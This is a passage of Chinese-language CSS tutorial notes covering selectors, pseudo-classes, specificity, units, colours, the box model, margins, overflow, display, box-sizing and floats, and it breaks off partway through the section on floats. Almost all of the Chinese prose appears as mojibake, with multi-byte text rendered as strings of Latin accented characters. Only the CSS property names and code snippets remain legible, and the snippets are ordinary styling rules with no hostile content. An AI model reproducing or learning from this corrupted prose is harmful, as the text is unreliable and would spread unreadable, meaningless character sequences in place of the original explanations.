ä¹æ¯å®çç¥ååç´ \n\nåä»£åç´ \n\n * ç´æ¥æé´æ¥è¢«ç¥ååç´ åå«çåç´ å«ååä»£åç´ \n * å­åç´ ä¹æ¯åä»£åç´ \n\nåå¼åç´ \n\n * æ¥æç¸åç¶åç´ çåç´ æ¯åå¼åç´ \n\nä½ç¨ï¼éä¸­æå®ç¶åç´ çæå®å­åç´ \n\nè¯­æ³ï¼ç¶åç´  > å­åç´ \n\n# åä»£éæ©å¨\n\nä½ç¨ï¼éä¸­æå®åç´ åçæå®åä»£åç´ \n\nè¯­æ³ï¼ç¥å åä»£\n\n# åå¼åç´ éæ©å¨\n\n * éæ©ä¸ä¸ä¸ªåå¼\n\nè¯­æ³ï¼åä¸ä¸ª + ä¸ä¸ä¸ª\n\n * éæ©ä¸è¾¹ææçåå¼\n\nè¯­æ³ï¼å ~ å¼\n\n# å±æ§éæ©å¨\n\n[å±æ§å] éæ©å«ææå®å±æ§çåç´ \n\n[å±æ§å=å±æ§å¼] éæ©å«ææå®å±æ§åå±æ§å¼çåç´ \n\n[å±æ§å^=å±æ§å¼] éæ©å±æ§å¼ä»¥æå®å¼å¼å¤´çåç´ \n\n[å±æ§å$=å±æ§å¼] éæ©å±æ§å¼ä»¥æå®å¼ç»å°¾çåç´ \n\n[å±æ§å*=å±æ§å¼] éæ©å±æ§å¼ä¸­å«ææå¼çåç´ çåç´ \n\n# ä¼ªç±»éæ©å¨\n\nä¼ªç±»ï¼ä¸å­å¨çç±»ï¼ç¹æ®çç±»ï¼\n\n * ä¼ªç±»ç¨æ¥æè¿°ä¸ä¸ªåç´ çç¹æ®ç¶æ\n\næ¯å¦ï¼ç¬¬ä¸ä¸ªå­åç´ ãè¢«ç¹å»çåç´ ãé¼ æ ç§»å¥çåç´ ...\n\nä¼ªç±»ä¸è¬æåµä¸é½æ¯ä½¿ç¨:å¼å¤´\n\n * :first-child ç¬¬ä¸ä¸ªå­åç´ \n\n * :last-child æåä¸ªå­åç´ \n\n * :nth-child() éä¸­ç¬¬nä¸ªå­åç´ \n\nç¹æ®å¼ï¼\n\n * n ç¬¬nä¸ª nçèå´0å°æ­£æ ç©·\n\n * 2n æ even è¡¨ç¤ºéä¸­å¶æ°ä½çåç´ \n\n * 2n+1 æ odd è¡¨ç¤ºéä¸­å¥æ°ä½çåç´ \n\nä»¥ä¸è¿äºä¼ªç±»é½æ¯æ ¹æ®ææçå­åç´ è¿è¡æåº\n\n * :first-of-type\n\n * :last-of-type\n\n * :nth-of-type()\n\nè¿å ä¸ªä¼ªç±»çåè½åä¸è¿°çç±»ä¼¼ï¼ä¸éç¹æ¯ä»ä»¬æ¯å¨åç±»ååç´ ä¸­è¿è¡æåº\n\n * :not() å¦å®ä¼ªç±»\n\nå°ç¬¦åæ¡ä»¶çåç´ ä»éæ©å¨ä¸­å»é¤\n\n# ä¼ªåç´ éæ©å¨\n\nä¼ªåç´ ï¼è¡¨ç¤ºé¡µé¢ä¸­ä¸äºç¹æ®çå¹¶ä¸çå®çå­å¨çåç´ ï¼ç¹æ®çä½ç½®ï¼\n\nä¼ªåç´ ä½¿ç¨ :: å¼å¤´\n\n * ::first-letter è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ¯\n\n * ::first-line è¡¨ç¤ºç¬¬ä¸è¡\n\n * ::selection è¡¨ç¤ºéä¸­çåå®¹\n\n * ::before åç´ çå¼å§\n\n * ::after åç´ çæå\n\n * before å after å¿é¡»ç»åcontentå±æ§æ¥ä½¿ç¨\n\n# æ ·å¼ç»§æ¿\n\næä»¬ä¸ºä¸ä¸ªåç´ è®¾ç½®çæ ·å¼åæ¶ä¹ä¼åºç¨å°å®çåä»£åç´ ä¸ï¼ç»§æ¿æ¯åçå¨ç¥åååä»£ä¹é´ç\n\nç»§æ¿çè®¾è®¡æ¯ä¸ºäºæ¹ä¾¿æä»¬çå¼åï¼å©ç¨ç»§æ¿æä»¬å¯ä»¥å°ä¸äºéç¨çæ ·å¼ç»ä¸è®¾ç½®å°å±åçç¥ååç´ ä¸ï¼è¿æ ·åªéè®¾ç½®ä¸æ¬¡å³å¯è®©ææçåç´ é½å·æè¯¥æ ·å¼\n\næ³¨æï¼å¹¶ä¸æ¯ææçæ ·å¼é½ä¼è¢«ç»§æ¿ï¼æ¯å¦èæ¯ç¸å³çï¼å¸å±ç¸å³ç­çè¿äºæ ·å¼é½ä¸ä¼è¢«ç»§æ¿ã\n\n# éæ©å¨æé\n\nå½æä»¬éè¿ä¸åçéæ©å¨ï¼éä¸­ç¸åçåç´ ï¼å¹¶ä¸ä¸ºç¸åçæ ·å¼è®¾ç½®ä¸åçå¼æ¶ï¼æ­¤æ¶å°±åçäºæ ·å¼çå²çªãåçæ ·å¼å²çªæ¶ï¼åºç¨åªä¸ªæ ·å¼ç±éæ©å¨çæéï¼ä¼åçº§ï¼å³å®ã\n\nåèæ ·å¼        1,0,0,0\n\nidéæ©å¨        0,1,0,0\n\nç±»åä¼ªç±»éæ©å¨   0,0,1,0\n\nåç´ éæ©å¨       0,0,0,1\n\néééæ©å¨       0,0,0,0\n\nç»§æ¿çæ ·å¼       æ²¡æä¼åçº§\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¯è¾ä¼åçº§æ¶ï¼éè¦å°ææçéæ©å¨çä¼åçº§è¿è¡ç¸å è®¡ç®ï¼æåä¼åçº§è¶é«ï¼åè¶ä¼åæ¾ç¤ºï¼åç»éæ©å¨æ¯åç¬è®¡ç®çï¼ï¼éæ©å¨çç´¯å ä¸ä¼è¶è¿å¶æå¤§çæ°éçº§ï¼ç±»éæ©å¨å¨é«ä¹ä¸ä¼è¶è¿idéæ©å¨ãå¦æä¼åçº§è®¡ç®åç¸åï¼æ­¤æ¶åä¼åä½¿ç¨é ä¸çæ ·å¼ãå¯ä»¥å¨æä¸ä¸ªæ ·å¼çåè¾¹æ·»å  !important ï¼åæ­¤æ¶è¯¥æ ·å¼ä¼è·åå°æé«çä¼åçº§ï¼çè³è¶è¿åèæ ·å¼ï¼å¨å¼åä¸­è¿ä¸ªç©æä¸å®è¦æç¨ï¼\n\n\n# åä½\n\nåç´ \n\n * å±å¹ï¼æ¾ç¤ºå¨ï¼å®éä¸æ¯ç±ä¸ä¸ªä¸ä¸ªçå°ç¹ç¹ææç\n * ä¸åå±å¹çåç´ å¤§å°æ¯ä¸åçï¼åç´ è¶å°çå±å¹æ¾ç¤ºçææè¶æ¸æ°\n * æä»¥åæ ·ç200pxå¨ä¸åçè®¾å¤ä¸æ¾ç¤ºææä¸ä¸æ ·\n\nç¾åæ¯\n\n * ä¹å¯ä»¥å°å±æ§å¼è®¾ç½®ä¸ºç¸å¯¹äºå¶ç¶åç´ å±æ§çç¾åæ¯\n * è®¾ç½®ç¾åæ¯å¯ä»¥ä½¿å­åç´ è·éç¶åç´ çæ¹åèæ¹å\n\nem\n\n * emæ¯ç¸å¯¹äºåç´ çå­ä½å¤§å°æ¥è®¡ç®ç\n * 1em = 1font-size\n * emä¼æ ¹æ®å­ä½å¤§å°çæ¹åèæ¹å\n\nrem\n\n * remæ¯ç¸å¯¹äºæ ¹åç´ çå­ä½å¤§å°æ¥è®¡ç®\n\n\n# é¢è²\n\nå¨cssä¸­å¯ä»¥ç´æ¥ä½¿ç¨é¢è²åæ¥è®¾ç½®åç§é¢è²ï¼æ¯å¦ï¼redãorangeãyellowãblueãgreenâ¦â¦ï¼ä½æ¯å¨cssä¸­ç´æ¥ä½¿ç¨é¢è²åæ¯éå¸¸çä¸æ¹ä¾¿ã\n\nrgbå¼ï¼\n\n * rgbéè¿ä¸ç§é¢è²çä¸åæµåº¦æ¥è°éåºä¸åçé¢è²\n * r redï¼g green ï¼b blue\n * æ¯ä¸ç§é¢è²çèå´å¨ 0 - 255 (0% - 100%) ä¹é´\n * è¯­æ³ï¼rgb(çº¢è²,ç»¿è²,èè²)\n\nrgba:\n\n * å°±æ¯å¨rgbçåºç¡ä¸å¢å äºä¸ä¸ªaè¡¨ç¤ºä¸éæåº¦\n * éè¦åä¸ªå¼ï¼åä¸ä¸ªårgbä¸æ ·ï¼ç¬¬åä¸ªè¡¨ç¤ºä¸éæåº¦ 1è¡¨ç¤ºå®å¨ä¸éæ 0è¡¨ç¤ºå®å¨éæ .5åéæ\n\nåå­è¿å¶çrgbå¼ï¼\n\n * è¯­æ³ï¼#çº¢è²ç»¿è²èè²\n * é¢è²æµåº¦éè¿ 00-ff\n * å¦æé¢è²ä¸¤ä½ä¸¤ä½éå¤å¯ä»¥è¿è¡ç®å #aabbcc --\x3e #abc\n\nhslå¼ hslaå¼\n\n * h è²ç¸(0 - 360)\n * s é¥±ååº¦ï¼é¢è²çæµåº¦ 0% - 100%\n * l äº®åº¦ï¼é¢è²çäº®åº¦ 0% - 100%\n\nbackground-color: red;\nbackground-color: rgb(255, 0, 0);\nbackground-color: rgb(0, 255, 0);\nbackground-color: rgb(0, 0, 255);\nbackground-color: rgb(255,255,255);\nbackground-color: rgb(106,153,85);\nbackground-color: rgba(106,153,85,.5);\nbackground-color: #ff0000;\nbackground-color: #ffff00;\nbackground-color: #ff0;\nbackground-color: #bbffaa;\nbackground-color: #9cdcfe;\nbackground-color: rgb(254, 156, 156);\nbackground-color: hsla(98, 48%, 40%, 0.658);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# å¸å±\n\n# ææ¡£æµ\n\nææ¡£æµï¼normal flowï¼\n\nç½é¡µæ¯ä¸ä¸ªå¤å±çç»æï¼ä¸å±æçä¸å±ï¼éè¿csså¯ä»¥åå«ä¸ºæ¯ä¸å±æ¥è®¾ç½®æ ·å¼ï¼ä½ä¸ºç¨æ·æ¥è®²åªè½çå°æé¡¶ä¸ä¸å±ãè¿äºå±ä¸­ï¼æåºä¸çä¸å±ç§°ä¸ºææ¡£æµï¼ææ¡£æµæ¯ç½é¡µçåºç¡ãæä»¬æåå»ºçåç´ é»è®¤é½æ¯å¨ææ¡£æµä¸­è¿è¡æåãå¯¹äºæä»¬æ¥åç´ ä¸»è¦æä¸¤ä¸ªç¶æï¼å¨ææ¡£æµä¸­ï¼ä¸å¨ææ¡£æµä¸­ï¼è±ç¦»ææ¡£æµï¼\n\nåç´ å¨ææ¡£æµä¸­æä»ä¹ç¹ç¹ï¼\n\n * ååç´ \n   * ååç´ ä¼å¨é¡µé¢ä¸­ç¬å ä¸è¡(èªä¸åä¸åç´æå)\n   * é»è®¤å®½åº¦æ¯ç¶åç´ çå¨é¨ï¼ä¼æç¶åç´ ææ»¡ï¼\n   * é»è®¤é«åº¦æ¯è¢«åå®¹æå¼ï¼å­åç´ ï¼\n * è¡ååç´ \n   * è¡ååç´ ä¸ä¼ç¬å é¡µé¢çä¸è¡ï¼åªå èªèº«çå¤§å°\n   * è¡ååç´ å¨é¡µé¢ä¸­å·¦åå³æ°´å¹³æåï¼å¦æä¸è¡ä¹ä¸­ä¸è½å®¹çº³ä¸ææçè¡ååç´ ï¼ååç´ ä¼æ¢å°ç¬¬äºè¡ç»§ç»­èªå·¦åå³æåï¼ä¹¦åä¹ æ¯ä¸è´ï¼\n   * è¡ååç´ çé»è®¤å®½åº¦åé«åº¦é½æ¯è¢«åå®¹æå¼\n\n# çå­æ¨¡å\n\nçæ¨¡åãçå­æ¨¡åãæ¡æ¨¡åï¼box modelï¼\n\ncsså°é¡µé¢ä¸­çææåç´ é½è®¾ç½®ä¸ºäºä¸ä¸ªç©å½¢ççå­ï¼å°åç´ è®¾ç½®ä¸ºç©å½¢ççå­åï¼å¯¹é¡µé¢çå¸å±å°±åæå°ä¸åççå­ææ¾å°ä¸åçä½ä½ç½®ãæ¯ä¸ä¸ªçå­é½ç±ä¸ä¸å ä¸ªé¨åç»æï¼\n\n * åå®¹åºï¼contentï¼\n\n * åè¾¹è·ï¼paddingï¼\n\n * è¾¹æ¡ï¼borderï¼\n\n * å¤è¾¹è·ï¼marginï¼\n\n# åå®¹åº\n\nåå®¹åºï¼contentï¼ï¼åç´ ä¸­çææçå­åç´ åææ¬åå®¹é½å¨åå®¹åºä¸­æåï¼åå®¹åºçå¤§å°ç±width å heightä¸¤ä¸ªå±æ§æ¥è®¾ç½®\n\n * width è®¾ç½®åå®¹åºçå®½åº¦\n\n * height è®¾ç½®åå®¹åºçé«åº¦\n\n# è¾¹æ¡\n\nè¾¹æ¡ï¼borderï¼ï¼è¾¹æ¡å±äºçå­è¾¹ç¼ï¼è¾¹æ¡éè¾¹å±äºçå­åé¨ï¼åºäºè¾¹æ¡é½æ¯çå­çå¤é¨ï¼è¾¹æ¡çå¤§å°ä¼å½±åå°æ´ä¸ªçå­çå¤§å°ãè¦è®¾ç½®è¾¹æ¡ï¼éè¦è³å°è®¾ç½®ä¸ä¸ªæ ·å¼ï¼\n\n * è¾¹æ¡çå®½åº¦ border-width\n\nborder-width: 10px;\n\nè¾¹æ¡çé»è®¤å¼ä¸è¬é½æ¯ 3ä¸ªåç´ ï¼border-widthå¯ä»¥ç¨æ¥æå®åä¸ªæ¹åçè¾¹æ¡çå®½åº¦ã\n\næ ¹æ®ä¸åçå¼çæåµï¼æä»¥ä¸å ç§è®¾ç½®æ¹å¼ï¼\n\n * åä¸ªå¼ï¼ä¸ å³ ä¸ å·¦\n\n * ä¸ä¸ªå¼ï¼ä¸ å·¦å³ ä¸\n\n * ä¸¤ä¸ªå¼ï¼ä¸ä¸ å·¦å³\n\n * ä¸ä¸ªå¼ï¼ä¸ä¸å·¦å³\n\né¤äºborder-widthè¿æä¸ç» border-xxx-widthï¼xxxå¯ä»¥æ¯ top right bottom leftãç¨æ¥åç¬æå®æä¸ä¸ªè¾¹çå®½åº¦\n\n * è¾¹æ¡çé¢è² border-color\n\nborder-colorç¨æ¥æå®è¾¹æ¡çé¢è²ï¼åæ ·å¯ä»¥åå«æå®åä¸ªè¾¹çè¾¹æ¡ï¼è§ååborder-widthä¸æ ·\n\nborder-colorä¹å¯ä»¥çç¥ä¸åï¼å¦æçç¥äºåèªå¨ä½¿ç¨colorçé¢è²å¼ã\n\n * è¾¹æ¡çæ ·å¼ border-style\n\nborder-style æå®è¾¹æ¡çæ ·å¼\n\n * solid è¡¨ç¤ºå®çº¿\n\n * dotted ç¹ç¶èçº¿\n\n * dashed èçº¿\n\n * double åçº¿\n\n * border-styleçé»è®¤å¼æ¯none è¡¨ç¤ºæ²¡æè¾¹æ¡\n\nborderç®åå±æ§ï¼éè¿è¯¥å±æ§å¯ä»¥åæ¶è®¾ç½®è¾¹æ¡ææçç¸å³æ ·å¼ï¼å¹¶ä¸æ²¡æé¡ºåºè¦æ±ãé¤äºborderä»¥å¤è¿æåä¸ª border-xxx\n\n * border-top\n\n * border-right\n\n * border-bottom\n\n * border-left\n\nborder: solid 10px orange;\nborder-top: 10px solid red\n\n\n1\n2\n\n\n# åè¾¹è·\n\nåå®¹åºåè¾¹æ¡ä¹é´çè·ç¦»æ¯åè¾¹è·ï¼ä¸å±æåä¸ªæ¹åçåè¾¹è·ï¼\n\n * padding-top\n * padding-right\n * padding-bottom\n * padding-left\n\nåè¾¹è·çè®¾ç½®ä¼å½±åå°çå­çå¤§å°ï¼èæ¯é¢è²ä¼å»¶ä¼¸å°åè¾¹è·ä¸ãä¸ä¸ªçå­çå¯è§æ¡çå¤§å°ï¼ç±åå®¹åº åè¾¹è· å è¾¹æ¡å±åå³å®ï¼æä»¥å¨è®¡ç®çå­å¤§å°æ¶ï¼éè¦å°è¿ä¸ä¸ªåºåå å°ä¸èµ·è®¡ç®ã\n\n/* padding-top: 100px;\npadding-left: 100px;\npadding-right: 100px;\npadding-bottom: 100px; */\n\n/* \npadding åè¾¹è·çç®åå±æ§ï¼å¯ä»¥åæ¶æå®åä¸ªæ¹åçåè¾¹è·\nè§ååborder-width ä¸æ ·\n*/\npadding: 10px 20px 30px 40px;\npadding: 10px 20px 30px ;\npadding: 10px 20px ;\npadding: 10px ;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# å¤è¾¹è·\n\nå¤è¾¹è·ä¸ä¼å½±åçå­å¯è§æ¡çå¤§å°ï¼ä½æ¯å¤è¾¹è·ä¼å½±åçå­çä½ç½®ãä¸å±æåä¸ªæ¹åçå¤è¾¹è·ï¼\n\nmargin-top\n\n * ä¸å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼åç´ ä¼åä¸ç§»å¨\n\nmargin-right\n\n * é»è®¤æåµä¸è®¾ç½®margin-rightä¸ä¼äº§çä»»ä½ææ\n\nmargin-bottom\n\n * ä¸å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼å¶ä¸è¾¹çåç´ ä¼åä¸ç§»å¨\n\nmargin-left\n\n * å·¦å¤è¾¹è·ï¼è®¾ç½®ä¸ä¸ªæ­£å¼ï¼åç´ ä¼åå³ç§»å¨\n\nmarginä¹å¯ä»¥è®¾ç½®è´å¼ï¼å¦ææ¯è´å¼ååç´ ä¼åç¸åçæ¹åç§»å¨ãåç´ å¨é¡µé¢ä¸­æ¯æç§èªå·¦åå³çé¡ºåºæåçï¼æä»¥é»è®¤æåµä¸å¦ææä»¬è®¾ç½®çå·¦åä¸å¤è¾¹è·åä¼ç§»å¨åç´ èªèº«ãèè®¾ç½®ä¸åå³å¤è¾¹è·ä¼ç§»å¨å¶ä»åç´ \n\nmarginçç®åå±æ§ï¼margin å¯ä»¥åæ¶è®¾ç½®åä¸ªæ¹åçå¤è¾¹è· ï¼ç¨æ³åpaddingä¸æ ·ãmarginä¼å½±åå°çå­å®éå ç¨ç©ºé´ã\n\n/* margin-top: 100px;\nmargin-left: 100px;\nmargin-bottom: 100px; */\n\n/* margin-bottom: 100px; */\n/* margin-top: -100px; */\n/* margin-left: -100px; */\n/* margin-bottom: -100px; */\n\n/* margin-right: 0px; */\n\nmargin: 100px;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# çå­æ¨¡åçæ°´å¹³å¸å±\n\nåç´ çæ°´å¹³æ¹åçå¸å±ï¼åç´ å¨å¶ç¶åç´ ä¸­æ°´å¹³æ¹åçä½ç½®ç±ä»¥ä¸å ä¸ªå±æ§å±åå³å®ï¼\n\n * margin-left\n * border-left\n * padding-left\n * width\n * padding-right\n * border-right\n * margin-right\n\nä¸ä¸ªåç´ å¨å¶ç¶åç´ ä¸­ï¼æ°´å¹³å¸å±å¿é¡»è¦æ»¡è¶³ä»¥ä¸çç­å¼ margin-left+border-left+padding-left+width+padding-right+border-right+margin-right = å¶ç¶åç´ åå®¹åºçå®½åº¦ ï¼å¿é¡»æ»¡è¶³ï¼\n\nå¦ä»¥ä¸çä¾å­ï¼\n\n0 + 0 + 0 + 200 + 0 + 0 + 0 = 800\n0 + 0 + 0 + 200 + 0 + 0 + 600 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 400 = 800\n100 + 0 + 0 + 200 + 0 + 0 + 500 = 800\n\n\n1\n2\n3\n4\n\n\nä»¥ä¸ç­å¼å¿é¡»æ»¡è¶³ï¼å¦æç¸å ç»æä½¿ç­å¼ä¸æç«ï¼åç§°ä¸ºè¿åº¦çº¦æï¼åç­å¼ä¼èªå¨è°æ´ã\n\nè°æ´çæ¹å¼ï¼\n\nå¦æè¿ä¸ä¸ªå¼ä¸­æ²¡æä¸º auto çæåµï¼åæµè§å¨ä¼èªå¨è°æ´margin-rightå¼ä»¥ä½¿ç­å¼æ»¡è¶³ãè¿ä¸ä¸ªå¼ä¸­æä¸ä¸ªå¼å¯ä»¥è®¾ç½®ä¸ºauto\n\n * width\n * margin-left\n * maring-right\n\nå¦ææä¸ªå¼ä¸ºautoï¼åä¼èªå¨è°æ´ä¸ºautoçé£ä¸ªå¼ä»¥ä½¿ç­å¼æç«ã\n\n0 + 0 + 0 + auto + 0 + 0 + 0 = 800  auto = 800\n0 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 600\n200 + 0 + 0 + auto + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + 200 = 800  auto = 400\nauto + 0 + 0 + 200 + 0 + 0 + auto = 800  auto = 300\n\n\n1\n2\n3\n4\n5\n\n\nå¦æå°ä¸ä¸ªå®½åº¦åä¸ä¸ªå¤è¾¹è·è®¾ç½®ä¸ºautoï¼åå®½åº¦ä¼è°æ´å°æå¤§ï¼è®¾ç½®ä¸ºautoçå¤è¾¹è·ä¼èªå¨ä¸º0ã\n\nå¦æå°ä¸ä¸ªå¼é½è®¾ç½®ä¸ºautoï¼åå¤è¾¹è·é½æ¯0ï¼å®½åº¦æå¤§\n\nå¦æå°ä¸¤ä¸ªå¤è¾¹è·è®¾ç½®ä¸ºautoï¼å®½åº¦åºå®å¼ï¼åä¼å°å¤è¾¹è·è®¾ç½®ä¸ºç¸åçå¼ãæä»¥æä»¬ç»å¸¸å©ç¨è¿ä¸ªç¹ç¹æ¥ä½¿ä¸ä¸ªåç´ å¨å¶ç¶åç´ ä¸­æ°´å¹³å±ä¸­ã\n\nwidth:xxxpx;\nmargin:0 auto;\n\n\n1\n2\n\n\n# çå­åç´å¸å±\n\né»è®¤æåµä¸ç¶åç´ çé«åº¦è¢«åå®¹æå¼ï¼å­åç´ æ¯å¨ç¶åç´ çåå®¹åºä¸­æåçï¼å¦æå­åç´ çå¤§å°è¶è¿äºç¶åç´ ï¼åå­åç´ ä¼ä»ç¶åç´ ä¸­æº¢åºãä½¿ç¨ overflow å±æ§æ¥è®¾ç½®ç¶åç´ å¦ä½å¤çæº¢åºçå­åç´ ï¼\n\n * visibleï¼é»è®¤å¼ å­åç´ ä¼ä»ç¶åç´ ä¸­æº¢åºï¼å¨ç¶åç´ å¤é¨çä½ç½®æ¾ç¤º\n\n * hidden æº¢åºåå®¹å°ä¼è¢«è£åªä¸ä¼æ¾ç¤º\n\n * scroll çæä¸¤ä¸ªæ»å¨æ¡ï¼éè¿æ»å¨æ¡æ¥æ¥çå®æ´çåå®¹\n\n * auto æ ¹æ®éè¦çææ»å¨æ¡\n\noverflow-x: \n\noverflow-y:\n\n\n1\n2\n3\n\n\n# åç´å¤è¾¹è·çæå \n\nç¸é»çåç´æ¹åå¤è¾¹è·ä¼åçéå ç°è±¡\n\nåå¼åç´ \n\n * åå¼åç´ é´çç¸é»åç´å¤è¾¹è·ä¼åä¸¤èä¹é´çè¾å¤§å¼ï¼ä¸¤èé½æ¯æ­£å¼ï¼\n\n * ç¹æ®æåµï¼å¦æç¸é»çå¤è¾¹è·ä¸æ­£ä¸è´ï¼ååä¸¤èçåãå¦æç¸é»çå¤è¾¹è·é½æ¯è´å¼ï¼ååä¸¤èä¸­ç»å¯¹å¼è¾å¤§ç\n\n * åå¼åç´ ä¹é´çå¤è¾¹è·çéå ï¼å¯¹äºå¼åæ¯æå©çï¼æä»¥æä»¬ä¸éè¦è¿è¡å¤ç\n\nç¶å­åç´ \n\n * ç¶å­åç´ é´ç¸é»å¤è¾¹è·ï¼å­åç´ çä¼ä¼ éç»ç¶åç´ ï¼ä¸å¤è¾¹è·ï¼\n * ç¶å­å¤è¾¹è·çæå ä¼å½±åå°é¡µé¢çå¸å±ï¼å¿é¡»è¦è¿è¡å¤ç\n\n# è¡ååç´ ççå­æ¨¡å\n\n * è¡ååç´ ä¸æ¯æè®¾ç½®å®½åº¦åé«åº¦\n\n * è¡ååç´ å¯ä»¥è®¾ç½®paddingï¼ä½æ¯åç´æ¹åpaddingä¸ä¼å½±åé¡µé¢çå¸å±\n\n * è¡ååç´ å¯ä»¥è®¾ç½®borderï¼åç´æ¹åçborderä¸ä¼å½±åé¡µé¢çå¸å±\n\n * è¡ååç´ å¯ä»¥è®¾ç½®marginï¼åç´æ¹åçmarginä¸ä¼å½±åå¸å±\n\ndisplay ç¨æ¥è®¾ç½®åç´ æ¾ç¤ºçç±»åï¼æä»¥ä¸å ç§å¯éå¼ã\n\n * inline å°åç´ è®¾ç½®ä¸ºè¡ååç´ \n\n * block å°åç´ è®¾ç½®ä¸ºååç´ \n\n * inline-block å°åç´ è®¾ç½®ä¸ºè¡åååç´ ï¼æ¢å¯ä»¥è®¾ç½®å®½åº¦åé«åº¦åä¸ä¼ç¬å ä¸è¡\n\n * table å°åç´ è®¾ç½®ä¸ºä¸ä¸ªè¡¨æ ¼\n\n * none åç´ ä¸å¨é¡µé¢ä¸­æ¾ç¤º\n\nvisibility ç¨æ¥è®¾ç½®åç´ çæ¾ç¤ºç¶æ\n\n * visible é»è®¤å¼ï¼åç´ å¨é¡µé¢ä¸­æ­£å¸¸æ¾ç¤º\n\n * hidden åç´ å¨é¡µé¢ä¸­éè ä¸æ¾ç¤ºï¼ä½æ¯ä¾ç¶å æ®é¡µé¢çä½ç½®\n\n# é»è®¤æ ·å¼\n\néå¸¸æåµï¼æµè§å¨é½ä¼ä¸ºåç´ è®¾ç½®ä¸äºé»è®¤æ ·å¼ï¼é»è®¤æ ·å¼çå­å¨ä¼å½±åå°é¡µé¢çå¸å±ï¼éå¸¸æåµä¸ç¼åç½é¡µæ¶å¿é¡»è¦å»é¤æµè§å¨çé»è®¤æ ·å¼ï¼pcç«¯çé¡µé¢ï¼ã\n\nbody{\n  margin: 0;\n}\n\np{\n  margin: 0;\n}\n\nul{\n  margin: 0;\n  padding: 0;\n  /*å»é¤é¡¹ç®ç¬¦å·*/\n  list-style:none; \n}\n\n*{\n  margin: 0;\n  padding: 0;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\néç½®æ ·å¼è¡¨ï¼ä¸é¨ç¨æ¥å¯¹æµè§å¨çæ ·å¼è¿è¡éç½®çã\n\n * reset.css ç´æ¥å»é¤äºæµè§å¨çé»è®¤æ ·å¼\n * normalize.css å¯¹é»è®¤æ ·å¼è¿è¡äºç»ä¸\n\n# çå­å°ºå¯¸\n\né»è®¤æåµä¸ï¼çå­å¯è§æ¡çå¤§å°ç±åå®¹åºãåè¾¹è·åè¾¹æ¡å±åå³å®ãbox-sizing ç¨æ¥è®¾ç½®çå­å°ºå¯¸çè®¡ç®æ¹å¼ï¼è®¾ç½®widthåheightçä½ç¨ï¼ã\n\n * content-box é»è®¤å¼ï¼å®½åº¦åé«åº¦ç¨æ¥è®¾ç½®åå®¹åºçå¤§å°\n\n * border-box å®½åº¦åé«åº¦ç¨æ¥è®¾ç½®æ´ä¸ªçå­å¯è§æ¡çå¤§å°\n\n * width å height æçæ¯åå®¹åº å åè¾¹è· å è¾¹æ¡çæ»å¤§å°\n\n# è½®å»ååè§\n\nbox-shadow ç¨æ¥è®¾ç½®åç´ çé´å½±ææï¼é´å½±ä¸ä¼å½±åé¡µé¢å¸å± ã\n\n * ç¬¬ä¸ä¸ªå¼ æ°´å¹³åç§»é è®¾ç½®é´å½±çæ°´å¹³ä½ç½® æ­£å¼åå³ç§»å¨ è´å¼åå·¦ç§»å¨\n\n * ç¬¬äºä¸ªå¼ åç´åç§»é è®¾ç½®é´å½±çæ°´å¹³ä½ç½® æ­£å¼åä¸ç§»å¨ è´å¼åä¸ç§»å¨\n\n * ç¬¬ä¸ä¸ªå¼ é´å½±çæ¨¡ç³åå¾\n\n * ç¬¬åä¸ªå¼ é´å½±çé¢è²\n\noutline ç¨æ¥è®¾ç½®åç´ çè½®å»çº¿ï¼ç¨æ³åborderä¸æ¨¡ä¸æ ·ãè½®å»åè¾¹æ¡ä¸åçç¹ï¼å°±æ¯è½®å»ä¸ä¼å½±åå°å¯è§æ¡çå¤§å°ã\n\nborder-radius: ç¨æ¥è®¾ç½®åè§ åè§è®¾ç½®çåçåå¾å¤§å°ï¼\n\n/* border-top-left-radius:  */\n/* border-top-right-radius */\n/* border-bottom-left-radius:  */\n/* border-bottom-right-radius:  */\n/* border-top-left-radius:50px 100px; */\n\n\n1\n2\n3\n4\n5\n\n\nborder-radius å¯ä»¥åå«æå®åä¸ªè§çåè§\n\n * åä¸ªå¼ å·¦ä¸ å³ä¸ å³ä¸ å·¦ä¸\n\n * ä¸ä¸ªå¼ å·¦ä¸ å³ä¸/å·¦ä¸ å³ä¸\n\n * ä¸¤ä¸ªä¸ªå¼ å·¦ä¸/å³ä¸ å³ä¸/å·¦ä¸\n\n/* å°åç´ è®¾ç½®ä¸ºä¸ä¸ªåå½¢ */\nborder-radius: 50%;    \n\n\n1\n2\n\n\n\n# æµ®å¨\n\néè¿æµ®å¨å¯ä»¥ä½¿ä¸ä¸ªåç´ åå¶ç¶åç´ çå·¦ä¾§æå³ä¾§ç§»å¨ï¼ä½¿ç¨ float å±æ§æ¥è®¾ç½®äºåç´ çæµ®å¨ã\n\n * none é»è®¤å¼ ï¼åç´ ä¸æµ®å¨\n\n * left åç´ åå·¦æµ®å¨\n\n * right åç´ åå³æµ®å¨\n\næ³¨æï¼åç´ è®¾ç½®æµ®å¨ä»¥åï¼æ°´å¹³å¸å±çç­å¼ä¾¿ä¸éè¦å¼ºå¶æç«ãåç´ è®¾ç½®æµ®å¨ä»¥åï¼ä¼å®å¨ä»ææ¡£æµä¸­è±ç¦»ï¼ä¸åå ç¨ææ¡£æµçä½ç½®ï¼æä»¥åç´ ä¸è¾¹çè¿å¨ææ¡£æµä¸­çåç´ ä¼èªå¨åä¸ç§»å¨ã\n\næµ®å¨çç¹ç¹ï¼\n\n1ãæµ®å¨åç´ ä¼å®å¨è±ç¦»ææ¡£æµï¼ä¸åå æ®ææ¡£æµä¸­çä½ç½®\n\n2ãè®¾ç½®æµ®å¨ä»¥ååç´ ä¼åç¶åç´ çå·¦ä¾§æå³ä¾§ç§»å¨ï¼\n\n3ãæµ®å¨åç´ 